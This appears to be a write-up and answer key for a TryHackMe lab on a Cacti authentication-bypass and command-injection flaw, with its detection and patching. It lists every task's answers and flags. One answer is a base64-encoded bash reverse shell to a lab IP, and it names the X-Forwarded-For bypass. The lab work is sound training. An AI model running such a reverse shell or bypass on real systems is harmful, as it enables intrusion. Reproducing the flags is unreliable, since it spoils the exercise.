# 🌵 Cactus  
🔗 Link to the room: https://tryhackme.com/room/cactus

---

## 📌 Overview  
This room explores a critical vulnerability in Cacti, an open-source network monitoring tool.

The vulnerability allows attackers to:
- Bypass authentication  
- Execute remote commands (RCE)  

It also demonstrates detection and mitigation using logs, IDS tools, and SIEM platforms.

---

## 🎯 Learning Objectives  
- Understand how the vulnerability works  
- Exploit authentication bypass and command injection  
- Analyse logs for Indicators of Compromise (IoCs)  
- Use SIEM tools (Kibana) to investigate attacks  
- Apply mitigation and patching techniques  

---

## 🧠 Key Concepts  
- Authentication Bypass  
- Command Injection  
- Remote Code Execution (RCE)  
- Apache Log Analysis  
- SIEM Investigation  
- Suricata IDS Rules  
- Patch Management  

---

## ✅ Questions and Answers  

### 🔹 Task 1: Introduction  
**Q:** I have prepared the virtual machines needed for this room.  
**A:** No answer needed  

---

### 🔹 Task 2: Exploitation - Authentication Bypass  
**Q:** What is the HTTP header used to bypass authentication on `remote_agent.php`?  
**A:** `X-Forwarded-For`  

---

### 🔹 Task 3: Exploitation - Command Injection  

**Q:** What is the name of the hidden folder located in `/var/www/html`?  
**A:** `f39f9db5a7695930f1b267a4d33b092b`  

**Q:** What is the content of the `flag.txt` file located in the hidden folder?  
**A:** `THM{de0c87d30debe82e7747c594574db1eb}`  

---

### 🔹 Task 4: Detection - Log Analysis and Alerting  

**Q:** What is the Source IP of the adversary that successfully exploited the vulnerability on July 20?  
**A:** `10.10.135.237`  

**Q:** What is the base64-decoded flag submitted by this adversary?  
**A:** `THM{d0nT_4g3t_b64_d3c0d3}`  

**Q:** What is the original value of `default-rule-path`?  
**A:** `/var/lib/suricata/rules`  

---

### 🔹 Task 5: Detection - SIEM (Kibana)  

**Q:** What field handled the value `remote_agent.php` in the Elastic query?  
**A:** `url.original`  

**Q:** Excluding localhost IPs, what is the Source IP of the attacker?  
**A:** `10.10.135.237`  

**Q:** What is the encoded base64 string used by the attacker?  
**A:** YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTM1LjIzNy8zMTMzNyA8JjEn


---

### 🔹 Task 6: Mitigation  

**Q:** What function restricts input to integers for `poller_id`?  
**A:** `get_filter_request_var`  

**Q:** What function sanitizes strings to prevent command injection?  
**A:** `cacti_escapeshellarg`  

**Q:** What function was modified to prevent authentication bypass?  
**A:** `get_client_addr`  

---

### 🔹 Task 7: Conclusion  
**Q:** I enjoyed the room!  
**A:** No answer needed  

---

## 🚀 Summary  
This room demonstrates how a critical vulnerability can be chained:

Authentication Bypass → Command Injection → Remote Code Execution  

It also highlights the importance of:
- Monitoring logs  
- Using SIEM tools for investigation  
- Deploying IDS solutions like Suricata  
- Applying proper patch management  

Mastering these concepts is essential for:
- Penetration Testing  
- SOC Analysis  
- Threat Detection & Response  
